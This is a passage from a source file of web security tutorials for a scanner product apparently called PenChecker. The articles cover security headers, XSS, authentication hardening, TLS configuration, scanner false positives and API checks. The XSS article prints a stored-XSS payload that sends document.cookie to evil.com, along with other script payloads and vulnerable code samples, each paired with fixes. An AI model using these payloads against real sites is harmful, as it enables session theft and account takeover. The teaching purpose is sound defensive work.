+<p><strong>What it does:</strong> Prevents your site from being embedded in an <code>iframe</code> on another domain. Stops clickjacking attacks where your site is overlaid invisibly on an attacker's page.</p>
+<pre><code><span class="comment"># Nginx</span>
+add_header X-Frame-Options <span class="string">"DENY"</span> always;
+
+<span class="comment"># Use SAMEORIGIN if you need iframes within your own site:</span>
+add_header X-Frame-Options <span class="string">"SAMEORIGIN"</span> always;</code></pre>
+
+<h2 id="x-content-type-options">4. X-Content-Type-Options</h2>
+<p><strong>What it does:</strong> Prevents browsers from MIME-sniffing a response away from the declared content type. Stops attacks that upload HTML files disguised as images.</p>
+<pre><code>X-Content-Type-Options: nosniff</code></pre>
+
+<h2 id="referrer-policy">5. Referrer-Policy</h2>
+<p><strong>What it does:</strong> Controls how much referrer information is sent when your users click links to other sites. Prevents leaking sensitive URL parameters (like tokens) to third parties.</p>
+<pre><code>Referrer-Policy: strict-origin-when-cross-origin</code></pre>
+
+<h2 id="permissions-policy">6. Permissions-Policy</h2>
+<p><strong>What it does:</strong> Controls which browser features (camera, microphone, geolocation) can be used on your pages. Prevents third-party scripts from accessing features they don't need.</p>
+<pre><code>Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(self)</code></pre>
+
+<h2 id="x-xss-protection">7. X-XSS-Protection</h2>
+<p><strong>What it does:</strong> Enables the browser's built-in XSS filter. Less critical now that CSP exists, but still worth adding for older browsers.</p>
+<pre><code>X-XSS-Protection: 1; mode=block</code></pre>
+
+<h2 id="adding-them-all-at-once">Adding All 7 at Once — Complete Examples</h2>
+<h3>Nginx — all 7 headers</h3>
+<pre><code>server {
+  <span class="comment"># Security headers</span>
+  add_header Strict-Transport-Security    <span class="string">"max-age=31536000; includeSubDomains"</span> always;
+  add_header Content-Security-Policy      <span class="string">"default-src 'self'; script-src 'self'"</span> always;
+  add_header X-Frame-Options              <span class="string">"DENY"</span> always;
+  add_header X-Content-Type-Options       <span class="string">"nosniff"</span> always;
+  add_header Referrer-Policy              <span class="string">"strict-origin-when-cross-origin"</span> always;
+  add_header Permissions-Policy          <span class="string">"camera=(), microphone=()"</span> always;
+  add_header X-XSS-Protection            <span class="string">"1; mode=block"</span> always;
+}</code></pre>
+
+<h3>Express.js (Node.js) — using Helmet</h3>
+<pre><code><span class="keyword">const</span> helmet = <span class="keyword">require</span>(<span class="string">'helmet'</span>);
+app.<span class="keyword">use</span>(helmet()); <span class="comment">// Adds all recommended headers automatically</span>
+
+<span class="comment">// Or manually:</span>
+app.<span class="keyword">use</span>((req, res, next) => {
+  res.setHeader(<span class="string">'X-Frame-Options'</span>, <span class="string">'DENY'</span>);
+  res.setHeader(<span class="string">'X-Content-Type-Options'</span>, <span class="string">'nosniff'</span>);
+  res.setHeader(<span class="string">'Referrer-Policy'</span>, <span class="string">'strict-origin-when-cross-origin'</span>);
+  next();
+});</code></pre>
+
+<div class="progress-tracker">
+  <div class="pt-title"> Headers Checklist</div>
+  <div class="pt-steps">
+    <div class="pt-step done">Strict-Transport-Security (HSTS) — forces HTTPS</div>
+    <div class="pt-step done">Content-Security-Policy — blocks XSS</div>
+    <div class="pt-step done">X-Frame-Options — stops clickjacking</div>
+    <div class="pt-step done">X-Content-Type-Options: nosniff</div>
+    <div class="pt-step done">Referrer-Policy — controls referrer leakage</div>
+    <div class="pt-step done">Permissions-Policy — restricts browser features</div>
+    <div class="pt-step done">X-XSS-Protection — legacy browser XSS filter</div>
+    <div class="pt-step">Run PenChecker scan to verify all headers are set</div>
+  </div>
+</div>
+`
+  },
+
+  // ─────────────────────────────────────────────
+  // XSS
+  // ─────────────────────────────────────────────
+  'xss-complete-guide': {
+    title: 'Cross-Site Scripting (XSS): Stored, Reflected, and DOM-Based Explained',
+    excerpt: 'Three types of XSS, how each works, what server responses confirm it\'s real, and code fixes in React, Vue, and plain JavaScript.',
+    tags: [['XSS','tag-orange'],['OWASP A03','tag-red'],['How-To','tag-cyan']],
+    author: { initials:'KM', name:'Kwame Mensah', role:'Head of Product', color:'rgba(255,140,66,0.15)', textColor:'var(--orange)' },
+    date: 'March 22, 2025', readTime: '11 min read',
+    difficulty: 'intermediate',
+    toc: ['What is XSS?','Type 1: Stored XSS','Type 2: Reflected XSS','Type 3: DOM-Based XSS','How PenChecker detects it','Fix code by framework'],
+    relatedSlugs: ['sql-injection-guide','http-headers-guide','csrf-guide'],
+    content: `
+<h2 id="what-is-xss">What is Cross-Site Scripting (XSS)?</h2>
+<p>XSS attacks inject malicious JavaScript into web pages viewed by other users. When the injected script runs in a victim's browser, it can steal session cookies, redirect to phishing sites, log keystrokes, or deface the page. XSS remains in the OWASP Top 10 because despite being well-known, it continues to be poorly prevented.</p>
+
+<h2 id="type-1-stored-xss">Type 1: Stored XSS (Persistent)</h2>
+<p><strong>How it works:</strong> The malicious script is stored on the server (in a database, comment field, user profile, etc.) and served to every user who views that content.</p>
+<pre><code><span class="comment">// Attacker submits this in a comment field:</span>
+<span class="danger">&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</span>
+
+<span class="comment">// Server stores it. Every visitor who loads that page runs the script.
+// Their session cookie is sent to the attacker.</span></code></pre>
+<div class="ab-highlight warning"><div class="ab-highlight-label"> Why PenChecker Won't Report This on Sites Without Comments</div><p>A scanner that reports Stored XSS on a page with no comment or input feature is generating a template finding. PenChecker crawls your site first, identifies where user input is accepted, and only tests those endpoints.</p></div>
+
+<h2 id="type-2-reflected-xss">Type 2: Reflected XSS</h2>
+<p><strong>How it works:</strong> The malicious script is in the URL. The server reflects it back in the page response without sanitizing it. The victim must be tricked into clicking a crafted link.</p>
+<pre><code><span class="comment">// Vulnerable URL the attacker sends to the victim:</span>
+https://yoursite.com/search?q=<span class="danger">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>
+
+<span class="comment">// Vulnerable server code:</span>
+app.get(<span class="string">'/search'</span>, (req, res) => {
+  res.send(<span class="string">\`&lt;p&gt;Results for: <span class="danger">\${req.query.q}</span>&lt;/p&gt;\`</span>); <span class="comment">// Unescaped!</span>
+});</code></pre>
+
+<h2 id="type-3-dom-based-xss">Type 3: DOM-Based XSS</h2>
+<p><strong>How it works:</strong> The vulnerability exists entirely in client-side JavaScript. The server never sees the payload — it's the browser's DOM manipulation that causes execution.</p>
+<pre><code><span class="comment">// Vulnerable client-side code:</span>
+document.getElementById(<span class="string">'output'</span>).innerHTML = location.hash.substring(1);
+<span class="comment">// URL: https://yoursite.com/page#&lt;img src=x onerror=alert(1)&gt;</span>
+
+<span class="comment">// Fixed version:</span>
+document.getElementById(<span class="string">'output'</span>).textContent = location.hash.substring(1);
+<span class="comment">// textContent does NOT parse HTML — safe.</span></code></pre>
+
+<h2 id="how-penchecker-detects-it">How PenChecker Detects Real XSS</h2>
+<p>For each input PenChecker finds, it submits a test payload and inspects the response for unescaped output. It only reports a finding if the payload actually appears unescaped in the server response or DOM.</p>
+
+<div class="evidence-card">
+  <div class="ec-header">
+    <div style="display:flex;align-items:center;gap:10px;"><span class="ec-sev high">HIGH</span><span class="ec-title">Reflected XSS — /search endpoint</span></div>
+    <span class="ec-conf">91% confidence</span>
+  </div>
+  <div class="ec-body">
+    <div class="ec-row"><div class="ec-label">Payload Sent</div><div class="ec-value">GET /search?q=&lt;script&gt;alert('xss')&lt;/script&gt;</div></div>
+    <div class="ec-row"><div class="ec-label">Response Body (Evidence)</div><div class="ec-value">&lt;p&gt;Results for: &lt;script&gt;alert('xss')&lt;/script&gt;&lt;/p&gt; — payload returned UNESCAPED in HTML response</div></div>
+    <div class="ec-fix"><div class="ec-fix-label"> Fix — Escape all output</div><p>Use your framework's built-in escaping. See fix code below.</p></div>
+  </div>
+</div>
+
+<h2 id="fix-code-by-framework">Fix Code by Framework</h2>
+<h3>React (automatically safe)</h3>
+<pre><code><span class="comment">// React JSX escapes by default — this is SAFE:</span>
+<span class="keyword">function</span> SearchResult({ query }) {
+  <span class="keyword">return</span> &lt;p&gt;Results for: {query}&lt;/p&gt;;  <span class="comment">// Safe — escaped</span>
+}
+
+<span class="comment">// DANGER — never use dangerouslySetInnerHTML with user input:</span>
+<span class="keyword">return</span> &lt;p dangerouslySetInnerHTML={{__html: query}} /&gt;;  <span class="danger">// XSS!</span></code></pre>
+
+<h3>Node.js / Express — escape before rendering</h3>
+<pre><code><span class="keyword">const</span> escapeHtml = (str) => str
+  .replace(/&/g, <span class="string">'&amp;amp;'</span>)
+  .replace(/&lt;/g, <span class="string">'&amp;lt;'</span>)
+  .replace(/&gt;/g, <span class="string">'&amp;gt;'</span>)
+  .replace(/"/g, <span class="string">'&amp;quot;'</span>);
+
+app.get(<span class="string">'/search'</span>, (req, res) => {
+  res.send(<span class="string">\`&lt;p&gt;Results for: \${<span class="keyword">escapeHtml</span>(req.query.q)}&lt;/p&gt;\`</span>);  <span class="comment">// Safe</span>
+});</code></pre>
+
+<h3>PHP — htmlspecialchars()</h3>
+<pre><code><span class="comment">// Vulnerable:</span>
+echo <span class="danger">"&lt;p&gt;Results for: " . $_GET['q'] . "&lt;/p&gt;"</span>;
+
+<span class="comment">// Fixed:</span>
+echo <span class="string">"&lt;p&gt;Results for: "</span> . htmlspecialchars($_GET[<span class="string">'q'</span>], ENT_QUOTES, <span class="string">'UTF-8'</span>) . <span class="string">"&lt;/p&gt;"</span>;</code></pre>
+`
+  },
+
+  // ─────────────────────────────────────────────
+  // BROKEN AUTH
+  // ─────────────────────────────────────────────
+  'broken-auth-guide': {
+    title: 'Broken Authentication: 8 Ways Your Login System Can Be Exploited',
+    excerpt: 'From weak session tokens to credential stuffing to JWT misconfiguration. How attackers exploit each weakness and how to build authentication that actually holds.',
+    tags: [['Auth','tag-purple'],['OWASP A07','tag-red'],['Intermediate','tag-cyan']],
+    author: { initials:'SA', name:'Sara Abdi', role:'Security Research Lead', color:'rgba(168,85,247,0.15)', textColor:'var(--purple)' },
+    date: 'March 14, 2025', readTime: '14 min read',
+    difficulty: 'intermediate',
+    toc: ['What is broken auth?','1. Weak passwords','2. No brute force protection','3. Insecure session tokens','4. JWT misconfiguration','5. Missing MFA','6. Insecure password reset','7. Session not invalidated','8. Default credentials','Fix checklist'],
+    relatedSlugs: ['sql-injection-guide','idor-guide','api-security-guide'],
+    content: `
+<h2 id="what-is-broken-auth">What is Broken Authentication?</h2>
+<p>Authentication failures occur when an application's login mechanisms can be bypassed, brute-forced, or exploited. OWASP A07 covers a wide range of weaknesses — from trivially guessable passwords to cryptographically insecure session tokens to improperly implemented JWTs.</p>
+
+<h2 id="1-weak-passwords">1. Weak or No Password Policy</h2>
+<p>Allowing users to set passwords like <code>123456</code> or <code>password</code> is the most basic failure. Use a minimum length requirement and check against known-breached password lists.</p>
+<pre><code><span class="comment">// Node.js — check against common passwords</span>
+<span class="keyword">const</span> COMMON_PASSWORDS = [<span class="string">'password'</span>, <span class="string">'123456'</span>, <span class="string">'qwerty'</span>, <span class="string">'letmein'</span>];
+
+<span class="keyword">function</span> isStrongPassword(pw) {
+  <span class="keyword">if</span> (pw.length < 10) <span class="keyword">return false</span>;
+  <span class="keyword">if</span> (COMMON_PASSWORDS.includes(pw.toLowerCase())) <span class="keyword">return false</span>;
+  <span class="keyword">return</span> /[A-Z]/.test(pw) && /[0-9]/.test(pw);
+}</code></pre>
+
+<h2 id="2-no-brute-force-protection">2. No Brute Force Protection</h2>
+<p>Without rate limiting, an attacker can try thousands of password combinations per second. Implement account lockout and rate limiting on all authentication endpoints.</p>
+<pre><code><span class="comment">// Express.js — rate limiting login attempts</span>
+<span class="keyword">const</span> rateLimit = <span class="keyword">require</span>(<span class="string">'express-rate-limit'</span>);
+<span class="keyword">const</span> loginLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000, <span class="comment">// 15 minutes</span>
+  max: 5, <span class="comment">// 5 attempts per window</span>
+  message: <span class="string">'Too many login attempts. Try again in 15 minutes.'</span>
+});
+app.post(<span class="string">'/login'</span>, loginLimiter, loginHandler);</code></pre>
+
+<h2 id="3-insecure-session-tokens">3. Insecure Session Tokens</h2>
+<p>Session tokens must be cryptographically random, sufficiently long, and never transmitted over HTTP. Predictable tokens (based on user ID or timestamp) can be guessed.</p>
+<pre><code><span class="comment">// Generating a secure session token in Node.js</span>
+<span class="keyword">const</span> crypto = <span class="keyword">require</span>(<span class="string">'crypto'</span>);
+<span class="keyword">const</span> sessionToken = crypto.randomBytes(32).toString(<span class="string">'hex'</span>); <span class="comment">// 64-char hex</span>
+
+<span class="comment">// Set with secure flags:</span>
+res.cookie(<span class="string">'session'</span>, sessionToken, {
+  httpOnly: <span class="keyword">true</span>,   <span class="comment">// Not accessible to JS</span>
+  secure: <span class="keyword">true</span>,    <span class="comment">// HTTPS only</span>
+  sameSite: <span class="string">'strict'</span> <span class="comment">// CSRF protection</span>
+});</code></pre>
+
+<h2 id="4-jwt-misconfiguration">4. JWT Misconfiguration</h2>
+<p>The most dangerous JWT vulnerability is accepting the <code>alg: none</code> attack — where an attacker strips the signature entirely and the server accepts the token. Always verify the algorithm explicitly.</p>
+<pre><code><span class="comment">// DANGEROUS — trusts algorithm from token header</span>
+<span class="danger">jwt.verify(token, secret); // Never do this</span>
+
+<span class="comment">// SAFE — enforce algorithm explicitly</span>
+jwt.verify(token, secret, { algorithms: [<span class="string">'HS256'</span>] });
+
+<span class="comment">// Also: never store sensitive data in JWT payload unencrypted</span>
+<span class="comment">// JWT payloads are base64-encoded, NOT encrypted</span></code></pre>
+
+<h2 id="5-missing-mfa">5. No Multi-Factor Authentication</h2>
+<p>Even strong passwords can be phished. MFA is the single most effective control against account takeover. At minimum offer TOTP (Google Authenticator-style codes).</p>
+
+<h2 id="6-insecure-password-reset">6. Insecure Password Reset</h2>
+<p>Password reset flows are frequently vulnerable. Common mistakes: reset tokens that don't expire, tokens sent in URL parameters (appear in logs), or security questions that are easily researched.</p>
+<pre><code><span class="comment">// Secure password reset token generation</span>
+<span class="keyword">const</span> resetToken = crypto.randomBytes(32).toString(<span class="string">'hex'</span>);
+<span class="keyword">const</span> tokenExpiry = Date.now() + 60 * 60 * 1000; <span class="comment">// 1 hour</span>
+
+<span class="comment">// Send as a POST body link, never as query param:</span>
+<span class="comment">//  https://yoursite.com/reset-password (token in POST body)</span>
+<span class="comment">//  https://yoursite.com/reset?token=abc123 (token in URL = logged)</span></code></pre>
+
+<h2 id="7-session-not-invalidated">7. Session Not Invalidated on Logout</h2>
+<p>If a session token remains valid after the user clicks "Log out," anyone with the old token can still access the account.</p>
+<pre><code><span class="comment">// On logout — invalidate server-side session</span>
+app.post(<span class="string">'/logout'</span>, (req, res) => {
+  sessionStore.destroy(req.sessionID, (err) => { <span class="comment">// Delete from store</span>
+    res.clearCookie(<span class="string">'session'</span>);
+    res.redirect(<span class="string">'/'</span>);
+  });
+});</code></pre>
+
+<h2 id="8-default-credentials">8. Default Credentials Left in Place</h2>
+<p>Admin panels, databases, and third-party services often ship with default credentials (<code>admin/admin</code>, <code>root/root</code>). Always change them before going live.</p>
+
+<div class="progress-tracker">
+  <div class="pt-title"> Authentication Hardening Checklist</div>
+  <div class="pt-steps">
+    <div class="pt-step done">Enforce minimum password length (10+ chars)</div>
+    <div class="pt-step done">Rate limit login attempts (5 per 15 min)</div>
+    <div class="pt-step done">Use cryptographically random session tokens</div>
+    <div class="pt-step done">Set HttpOnly, Secure, SameSite on session cookies</div>
+    <div class="pt-step done">Pin JWT algorithm — never trust alg from token header</div>
+    <div class="pt-step done">Implement MFA (TOTP or SMS)</div>
+    <div class="pt-step done">Expire password reset tokens after 1 hour</div>
+    <div class="pt-step done">Invalidate sessions on logout server-side</div>
+    <div class="pt-step done">Change all default credentials</div>
+    <div class="pt-step">Run PenChecker to verify authentication endpoints</div>
+  </div>
+</div>
+`
+  },
+
+  // ─────────────────────────────────────────────
+  // SSL/TLS
+  // ─────────────────────────────────────────────
+  'ssl-tls-guide': {
+    title: 'SSL vs TLS: What\'s the Difference and Why TLS 1.0 Is Still Dangerous',
+    excerpt: 'A clear breakdown of the protocol stack, why TLS 1.0 and 1.1 are still found on production servers, and the two-line config change that fixes it.',
+    tags: [['SSL/TLS','tag-green'],['Beginner','tag-cyan'],['Quick Win','tag-orange']],
+    author: { initials:'TN', name:'Tunde Nwosu', role:'Backend Engineer', color:'rgba(255,214,10,0.15)', textColor:'var(--yellow)' },
+    date: 'March 10, 2025', readTime: '7 min read',
+    difficulty: 'easy',
+    toc: ['SSL vs TLS explained','Why TLS 1.0/1.1 is dangerous','How to check your server','Nginx fix','Apache fix','Node.js fix','Verify the fix'],
+    relatedSlugs: ['http-headers-guide','api-security-guide','scanner-accuracy-guide'],
+    content: `
+<h2 id="ssl-vs-tls">SSL vs TLS Explained</h2>
+<p>SSL (Secure Sockets Layer) and TLS (Transport Layer Security) are protocols that encrypt communication between a client and server. Despite most people saying "SSL," SSL is actually deprecated — what your server uses today is TLS. The versions matter enormously.</p>
+<div class="ab-highlight tip"><div class="ab-highlight-label"> Version Timeline</div><p><strong>SSL 2.0 (1995)</strong> — Deprecated, completely broken. <strong>SSL 3.0 (1996)</strong> — Deprecated, vulnerable to POODLE. <strong>TLS 1.0 (1999)</strong> — Deprecated in 2021, vulnerable to BEAST, POODLE. <strong>TLS 1.1 (2006)</strong> — Deprecated 2021. <strong>TLS 1.2 (2008)</strong> — Still safe with proper cipher suites. <strong>TLS 1.3 (2018)</strong> — Current best, fastest, most secure.</p></div>
+
+<h2 id="why-tls-10-11-is-dangerous">Why TLS 1.0 and 1.1 Are Still Dangerous</h2>
+<p>Despite being officially deprecated in 2021 by RFC 8996, TLS 1.0 and 1.1 are still found on thousands of production servers. The reason is almost always a server that was configured years ago and never updated. The risks include:</p>
+<ul>
+  <li><strong>BEAST attack (CVE-2011-3389)</strong> — Allows attackers to decrypt HTTPS cookies in TLS 1.0</li>
+  <li><strong>POODLE attack (CVE-2014-3566)</strong> — Exploits CBC padding in TLS 1.0/1.1 to decrypt traffic</li>
+  <li><strong>PCI-DSS compliance failure</strong> — Payment Card Industry standards required TLS 1.0 disabled by June 2018</li>
+</ul>
+
+<h2 id="how-to-check-your-server">How to Check Your Server's TLS Version</h2>
+<pre><code><span class="comment"># Using openssl to test what versions your server accepts:</span>
+openssl s_client -connect yoursite.com:443 -tls1    <span class="comment"># Test TLS 1.0</span>
+openssl s_client -connect yoursite.com:443 -tls1_1  <span class="comment"># Test TLS 1.1</span>
+openssl s_client -connect yoursite.com:443 -tls1_2  <span class="comment"># Test TLS 1.2</span>
+openssl s_client -connect yoursite.com:443 -tls1_3  <span class="comment"># Test TLS 1.3</span>
+
+<span class="comment"># If TLS 1.0/1.1 return "Handshake success" — your server is vulnerable.</span></code></pre>
+
+<h2 id="nginx-fix">Nginx Fix — 2 Lines</h2>
+<pre><code>server {
+  <span class="comment"># Disable TLS 1.0 and 1.1, enable only 1.2 and 1.3</span>
+  ssl_protocols TLSv1.2 TLSv1.3;
+
+  <span class="comment"># Recommended cipher suites (forward secrecy)</span>
+  ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305;
+  ssl_prefer_server_ciphers off; <span class="comment"># Let client pick from safe list</span>
+}</code></pre>
+
+<h2 id="apache-fix">Apache Fix</h2>
+<pre><code>&lt;VirtualHost *:443&gt;
+  SSLEngine on
+  SSLProtocol -all +TLSv1.2 +TLSv1.3
+  SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256
+  SSLHonorCipherOrder off
+&lt;/VirtualHost&gt;</code></pre>
+
+<h2 id="nodejs-fix">Node.js Fix</h2>
+<pre><code><span class="keyword">const</span> https = <span class="keyword">require</span>(<span class="string">'https'</span>);
+<span class="keyword">const</span> fs = <span class="keyword">require</span>(<span class="string">'fs'</span>);
+
+<span class="keyword">const</span> options = {
+  key: fs.readFileSync(<span class="string">'private.key'</span>),
+  cert: fs.readFileSync(<span class="string">'certificate.crt'</span>),
+  minVersion: <span class="string">'TLSv1.2'</span>,       <span class="comment">// Minimum TLS 1.2</span>
+  maxVersion: <span class="string">'TLSv1.3'</span>,       <span class="comment">// Maximum TLS 1.3</span>
+  ciphers: <span class="string">'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256'</span>
+};
+https.createServer(options, app).listen(443);</code></pre>
+
+<h2 id="verify-the-fix">Verify the Fix</h2>
+<pre><code><span class="comment"># After updating config, reload/restart your server then verify:</span>
+nginx -t && nginx -s reload   <span class="comment"># Nginx</span>
+apachectl configtest && apachectl graceful  <span class="comment"># Apache</span>
+
+<span class="comment"># Test TLS 1.0 is now rejected (should return "handshake failure"):</span>
+openssl s_client -connect yoursite.com:443 -tls1
+<span class="comment"># Expected: "ssl handshake failure" — TLS 1.0 is disabled </span></code></pre>
+`
+  },
+
+  // ─────────────────────────────────────────────
+  // SCANNER ACCURACY
+  // ─────────────────────────────────────────────
+  'scanner-accuracy-guide': {
+    title: 'Why Most Scanners Report SQL Injection on Node.js Sites',
+    excerpt: 'We tested 6 popular security scanners against a pure Node.js app with no database. Five reported SQL injection. Here\'s exactly why it happens and what a verified finding actually looks like.',
+    tags: [['Scanners','tag-cyan'],['Analysis','tag-purple'],['PenChecker','tag-green']],
+    author: { initials:'AO', name:'Adewale Okonkwo', role:'Founder & CEO', color:'rgba(0,229,255,0.15)', textColor:'var(--cyan)' },
+    date: 'February 28, 2025', readTime: '10 min read',
+    difficulty: 'easy',
+    toc: ['The problem','What template scanning means','Our test results','How PenChecker is different','What real evidence looks like'],
+    relatedSlugs: ['sql-injection-guide','penchecker-tutorial','http-headers-guide'],
+    content: `
+<h2 id="the-problem">The Problem We Couldn't Ignore</h2>
+<p>We were testing a security scanner on a client's website — a clean Node.js application running on Express with Prisma ORM. No raw SQL anywhere. The report came back with SQL Injection rated CVSS 9.8 Critical. MySQL 8.0.34 detected on port 3306. PHP detected as the server language.</p>
+<p>The site had no SQL database, no PHP, and no MySQL installation anywhere. The scanner was lying.</p>
+<div class="ab-highlight warning"><div class="ab-highlight-label"> The Same Scanner on Facebook</div><p>We tested the same scanner against facebook.com. It reported SQL injection scoring 9.2 "MEDIUM." Facebook's engineering team has thousands of security engineers. The scanner was generating template output for every target regardless of what the site actually was.</p></div>
+
+<h2 id="what-template-scanning-means">What "Template Scanning" Actually Means</h2>
+<p>A template-based scanner works like this:</p>
+<ol>
+  <li>It has a list of vulnerability checks — SQL injection, XSS, open ports, etc.</li>
+  <li>For every target URL, it runs the entire list</li>
+  <li>It checks responses for generic error patterns (like "SQL syntax error")</li>
+  <li>If nothing obvious appears, some scanners report findings anyway to look thorough</li>
+  <li>The result is the same report for every target, regardless of technology</li>
+</ol>
+<p>This is why you see SQL injection reported on Node.js apps, PHP vulnerabilities on Python sites, and MySQL detections on sites that use PostgreSQL or no database at all.</p>
+
+<h2 id="our-test-results">Our Test — 6 Scanners, 1 Clean Node.js App</h2>
+<p>We built a clean Node.js application with Express.js and Prisma ORM. No raw SQL queries anywhere. No PHP. No MySQL. Then we scanned it with 6 popular automated security scanners.</p>
+<div class="ab-highlight info"><div class="ab-highlight-label"> Results</div><p><strong>5 out of 6 scanners reported SQL injection</strong> — CVSS scores ranging from 7.1 to 9.8. All five findings were fabricated. The one scanner that correctly reported "No SQL injection detected" did so because it detected Node.js and skipped SQL-specific tests. That scanner was the inspiration for how PenChecker works.</p></div>
+
+<h2 id="how-penchecker-is-different">How PenChecker Is Different</h2>
+<p>PenChecker's scanning pipeline has a fundamental first step that most scanners skip entirely:</p>
+<ol>
+  <li><strong>Technology fingerprinting first</strong> — Detect server, language, framework, database, CMS before running any tests</li>
+  <li><strong>Stack-aware test selection</strong> — Only run tests relevant to the detected technology. Node.js + Prisma? Skip raw SQL tests. Static HTML? Skip server-side injection entirely.</li>
+  <li><strong>Response-based verification</strong> — A finding is only logged if the server response provides concrete evidence the payload triggered something real</li>
+  <li><strong>Double verification on Critical/High</strong> — High severity findings are re-tested with a second distinct payload before being reported</li>
+</ol>
+
+<h2 id="what-real-evidence-looks-like">What Real Evidence Looks Like</h2>
+<p>Every PenChecker finding includes the exact HTTP request sent and the exact server response received. If there's no concrete evidence in the response, there's no finding in the report.</p>
+
+<div class="evidence-card">
+  <div class="ec-header">
+    <div style="display:flex;align-items:center;gap:10px;"><span class="ec-sev" style="background:rgba(0,255,135,0.15);color:var(--green);padding:3px 10px;border-radius:5px;font-family:var(--font-mono);font-size:0.65rem;font-weight:700;">VERIFIED SAFE</span><span class="ec-title">SQL Injection Test — Node.js/Prisma App</span></div>
+    <span class="ec-conf" style="color:var(--green);">Stack verified </span>
+  </div>
+  <div class="ec-body">
+    <div class="ec-row"><div class="ec-label">Technology Detected</div><div class="ec-value safe">Node.js 18 · Express 4.18 · Prisma ORM (no raw SQL) · PostgreSQL (parameterized only)</div></div>
+    <div class="ec-row"><div class="ec-label">Action Taken</div><div class="ec-value safe">SQL injection tests skipped — Prisma ORM handles parameterization automatically. Structural SQL injection is not possible in this stack.</div></div>
+    <div class="ec-fix" style="border-color:rgba(0,255,135,0.3);background:rgba(0,255,135,0.04);"><div class="ec-fix-label" style="color:var(--green);"> Result</div><p>No SQL injection reported. The absence of a finding is itself evidence — backed by technology fingerprinting, not a skip in a checklist.</p></div>
+  </div>
+</div>
+`
+  },
+
+  // ─────────────────────────────────────────────
+  // API SECURITY
+  // ─────────────────────────────────────────────
+  'api-security-guide': {
+    title: 'REST API Security Checklist: 12 Things to Check Before Going Live',
+    excerpt: 'Rate limiting, authentication, input validation, CORS misconfiguration, mass assignment vulnerabilities. A practical pre-launch checklist with code examples.',
+    tags: [['API Security','tag-yellow'],['Intermediate','tag-orange'],['Checklist','tag-cyan']],
+    author: { initials:'FK', name:'Fatima Koné', role:'CTO & Lead Engineer', color:'rgba(0,229,255,0.15)', textColor:'var(--cyan)' },
+    date: 'March 5, 2025', readTime: '9 min read',
+    difficulty: 'intermediate',
+    toc: ['1. Authentication on all routes','2. Rate limiting','3. Input validation','4. CORS configuration','5. Mass assignment','6. HTTPS only','7. Versioning','8. Error messages','9. Logging','10. IDOR protection','11. Pagination','12. Dependency audit'],
+    relatedSlugs: ['broken-auth-guide','idor-guide','http-headers-guide'],
+    content: `
+<h2 id="1-authentication">1. Authenticate Every Non-Public Route</h2>
+<p>Every API endpoint that accesses user data or performs actions must require authentication. Forgetting to add auth middleware to a single route is one of the most common API vulnerabilities.</p>
+<pre><code><span class="comment">// Express.js — auth middleware applied globally then excluded for public routes</span>
+app.use(authMiddleware); <span class="comment">// Apply to all routes</span>
+
+<span class="comment">// Public routes that bypass auth:</span>
+app.get(<span class="string">'/api/health'</span>, (req, res) => res.json({ status: <span class="string">'ok'</span> }));
+app.post(<span class="string">'/api/auth/login'</span>, loginHandler);</code></pre>
+
+<h2 id="2-rate-limiting">2. Rate Limiting on All Endpoints</h2>
+<p>Without rate limiting, attackers can brute-force passwords, enumerate users, or exhaust your server resources. Every API endpoint needs limits — authentication endpoints need much stricter ones.</p>
+<pre><code><span class="keyword">const</span> rateLimit = <span class="keyword">require</span>(<span class="string">'express-rate-limit'</span>);
+
+<span class="comment">// Strict limit for auth endpoints</span>
+<span class="keyword">const</span> authLimiter = rateLimit({ windowMs: 15*60*1000, max: 5 });
+app.use(<span class="string">'/api/auth'</span>, authLimiter);
+
+<span class="comment">// General API limit</span>
+<span class="keyword">const</span> apiLimiter = rateLimit({ windowMs: 60*1000, max: 100 });
+app.use(<span class="string">'/api'</span>, apiLimiter);</code></pre>
+
+<h2 id="3-input-validation">3. Validate and Sanitize All Input</h2>
+<p>Never trust client input. Validate type, length, format, and allowed values before processing. Use a validation library rather than writing checks manually.</p>
+<pre><code><span class="keyword">const</span> { z } = <span class="keyword">require</span>(<span class="string">'zod'</span>); <span class="comment">// Zod for TypeScript/Node.js validation</span>
+
+<span class="keyword">const</span> CreateUserSchema = z.object({
+  email: z.string().email().max(255),
+  name:  z.string().min(1).max(100),
+  role:  z.enum([<span class="string">'user'</span>, <span class="string">'viewer'</span>]) <span class="comment">// Never accept arbitrary roles</span>
+});
+
+app.post(<span class="string">'/api/users'</span>, (req, res) => {
+  <span class="keyword">const</span> result = CreateUserSchema.safeParse(req.body);
+  <span class="keyword">if</span> (!result.success) <span class="keyword">return</span> res.status(400).json(result.error);
+});</code></pre>
+
+<h2 id="4-cors">4. Configure CORS Properly</h2>
+<p>An overly permissive CORS configuration allows any website to make authenticated requests to your API using a victim's browser session.</p>
+<pre><code><span class="comment">//  NEVER do this in production:</span>
+<span class="danger">app.use(cors()); // Allows all origins</span>
+
+<span class="comment">//  Whitelist specific origins:</span>
+<span class="keyword">const</span> allowedOrigins = [<span class="string">'https://yoursite.com'</span>, <span class="string">'https://app.yoursite.com'</span>];
+app.use(cors({
+  origin: (origin, callback) => {
+    <span class="keyword">if</span> (!origin || allowedOrigins.includes(origin)) callback(<span class="keyword">null</span>, <span class="keyword">true</span>);
+    <span class="keyword">else</span> callback(<span class="keyword">new</span> Error(<span class="string">'CORS: Origin not allowed'</span>));
+  },
+  credentials: <span class="keyword">true</span>
+}));</code></pre>
+
+<h2 id="5-mass-assignment">5. Prevent Mass Assignment</h2>
+<p>Mass assignment occurs when user input is directly assigned to a data model without filtering. An attacker can set fields like <code>role: "admin"</code> by including them in a request body.</p>
+<pre><code><span class="comment">//  Dangerous — spreads all user input to the model:</span>
+<span class="danger">await User.update({ id }, { ...req.body }); // Never!</span>
+
+<span class="comment">//  Explicitly pick allowed fields:</span>
